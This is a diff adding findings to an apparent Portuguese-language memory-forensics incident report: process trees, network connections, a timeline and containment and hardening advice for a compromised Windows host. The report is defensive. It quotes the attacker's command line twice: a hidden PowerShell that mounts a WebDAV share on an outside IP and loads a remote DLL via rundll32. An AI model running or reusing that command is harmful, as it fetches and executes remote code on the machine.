@@ -132,3 +132,98 @@ Do `netscan.txt` (amostras filtradas em `netscan_external.txt`), foram observada
 - Enriquecer **`196.204.4.8`** (whois, passive DNS, reputação TI) e checar indicadores associados.  
 - Confirmar a **tarefa `{ED77AEE0-…}`**: ação, comando, caminho do binário, usuário, frequência (plugins de registry/scheduled tasks).
 
+
+---
+
+## 3. Evidências principais — Análise (atualização final)
+
+**Fio condutor confirmado (LOLBAS via WebDAV + DLL remota):**
+- Em `reports/dfir/cmdline.txt` há execução de **PowerShell** com janela oculta que **mapeia WebDAV externo** e **carrega DLL remota**:
+  - `powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry`
+- Em seguida, **`net.exe`** registra o mesmo mapeamento:
+  - `"C:\Windows\system32\net.exe" use \\45.9.74.32@8888\davwwwroot\`
+- **Implicação:** execução **living-off-the-land** (LOLBAS) para **baixar/executar** payload sem gravar local, com **evasão** por janela oculta e uso de **rundll32**.
+
+### 3.1 Processos e hierarquia
+- `pstree.txt` mostra cadeia de processos de sistema esperada no boot, além de múltiplos `msedge.exe` (renderer/utility), compatíveis com uso do navegador.
+- **Ponto crítico:** presença de **`powershell.exe` (PID 3692)** com a **cmdline maliciosa** acima, e **`net.exe` (PID 2416)** associada ao mapeamento WebDAV.
+- Registro de `WWAHost.exe (PID 6780)` ativo em rede, mas sem IoC direto neste momento.
+
+**Evidências:**  
+Ver `reports/dfir/findings/evidence_ps_tree.txt` e `reports/dfir/cmdline.txt`.
+
+### 3.2 Conexões de rede
+- `netscan.txt` mostra conexões legítimas de componentes Microsoft (`smartscreen.exe`, `svchost.exe` para endpoints MS/Akamai) e:
+  - **`svchost.exe (PID 1260)` → `196.204.4.8:80`** (HTTP) — **fora de rede interna**, **incomum** para serviço; manter sob investigação.
+- Para o **WebDAV 45.9.74.32:8888** (visto em **cmdline**), não houve linha correspondente em `netscan.txt` no recorte atual; pode ser que:
+  - a sessão tenha terminado antes da captura,
+  - tenha sido encapsulada de modo não listado,
+  - ou que o artefato de memória não traga essa sessão específica.
+  
+**Evidências:**  
+Ver `reports/dfir/findings/evidence_netscan_iocs.txt` e `reports/dfir/netscan.txt`.
+
+### 3.3 DLLs / Handles
+- Para **`svchost.exe (PID 1260)`**, `windows.dlllist` indica DLLs de **NetworkService** (nlasvc, dhcpcsvc, DNSAPI, WlanApi, mswsock, webio etc.), sugerindo papel **legítimo** de rede do sistema.  
+- **Sem indicação direta** de DLL dropada em diretório de usuário/Temp para o `svchost` analisado.
+
+**Evidências:**  
+Ver `reports/dfir/dlllist_pid1260.txt` (caso salvo) e `reports/dfir/dlllist_all.txt`.
+
+### 3.4 Injeções / Regiões anômalas (malfind)
+- No extrato fornecido de `malfind.txt`, **não** há bloco claramente atribuído aos PIDs **3692 (powershell)** ou **2416 (net)** ou ao `svchost` 1260.  
+- Dado o **modus operandi via DLL remota**, pode ter ocorrido **execução transitória** sem deixar mapeamentos clássicos detectáveis, ou o dump não capturou o momento da injeção.
+
+**Conclusão da seção 3:**  
+- O **IOC primário** é a **execução de PowerShell escondida** que mapeia **WebDAV externo (`45.9.74.32:8888`)** e chama **`rundll32`** para **DLL remota (`3435.dll`)**.  
+- Isso configura **execução + evasão** (LOLBAS), com **alto risco** de C2/payload em memória.  
+- O tráfego de `svchost.exe (PID 1260)` para `196.204.4.8:80` permanece **suspeito secundário** e requer enriquecimento.
+
+---
+
+## 4. Timeline do incidente — Narrativa consolidada
+
+1. **2024-07-04 10:44:50 UTC** — Serviços de base (`svchost.exe` múltiplos) iniciam (entradas `PsList/Sessions` no `timeliner.txt`).  
+2. **2024-07-04 10:45:14 UTC** — `msedge.exe` (utility network service) ativo, sugerindo navegação.  
+3. **2024-07-15 06:58–06:59 UTC** — `svchost.exe` (PIDs 440/1260) estabelecem conexões externas (TLS para MS/Akamai e **HTTP** para **`196.204.4.8:80`**).  
+4. **(Sem timestamp explícito no timeliner, mas confirmado em `cmdline.txt`)** — **`powershell.exe (PID 3692)`** executa com **janela oculta**:  
+   `net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry`  
+   ⇒ **Execução remota via WebDAV** e carregamento de **DLL** maliciosa.  
+5. **2024-07-15 07:00:00 UTC** — `timeliner` registra **criação de tarefa agendada** (`{ED77AEE0-EAFB-4133-B544-9E7C5632D902}`), possivelmente **persistência**; precisa de detalhamento (ação/target).
+
+**Leitura das evidências:**  
+- `reports/dfir/findings/evidence_cmdline_iocs.txt` (PowerShell/Net + WebDAV + rundll32)  
+- `reports/dfir/findings/evidence_scheduled_task.txt` (tarefa agendada)  
+- `reports/dfir/findings/evidence_netscan_iocs.txt` (rede para 196.204.4.8)
+
+**Recomendações específicas:**
+- **Conter** o host; **bloquear** `45.9.74.32:8888` e **196.204.4.8:80`** no perímetro.  
+- **Coletar** Event Logs (Security, PowerShell, Sysmon se houver), **Scheduled Tasks** (definição da `{ED77AEE0-…}`), **amcache/prefetch**.  
+- **Caçar** em endpoints por: `rundll32` invocando rede/UNC, uso de `net use` para `davwwwroot`, e conexões para os IPs citados.  
+- **Hardening**: ASR Rules para bloquear `rundll32` estranho e abuso de WebDAV, **Script Block Logging** e Constrained Language Mode em PowerShell, políticas de **WDAC/AppLocker**.
+
+
+---
+
+## Apêndice A — Linhas de evidência (extratos)
+
+### A.1 Cmdline / IoCs (PowerShell & WebDAV & rundll32)
+\`\`\`
+(veja também: reports/dfir/findings/evidence_cmdline_iocs.txt)
+\`\`\`
+
+### A.2 Netscan / IPs relevantes
+\`\`\`
+(veja também: reports/dfir/findings/evidence_netscan_iocs.txt)
+\`\`\`
+
+### A.3 Timeline / Scheduled Task
+\`\`\`
+(veja também: reports/dfir/findings/evidence_scheduled_task.txt)
+\`\`\`
+
+### A.4 pslist/pstree para PIDs 3692/2416/1260
+\`\`\`
+(veja também: reports/dfir/findings/evidence_ps_tree.txt)
+\`\`\`
+
